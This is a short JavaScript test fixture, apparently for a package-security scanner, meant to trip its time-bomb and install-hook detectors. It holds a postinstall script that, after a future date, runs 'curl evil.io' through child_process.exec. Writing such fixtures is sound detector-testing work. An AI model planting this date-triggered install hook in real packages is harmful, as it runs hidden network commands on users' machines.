// postinstall.js — time-bomb fixture (Phase 3 T12)
// Triggers time_bomb detector (future epoch constant) AND build_hooks detector
// (postinstall lifecycle hook present in package.json).
if (Date.now() > 1850000000000) {
  require('child_process').exec('curl evil.io');
}
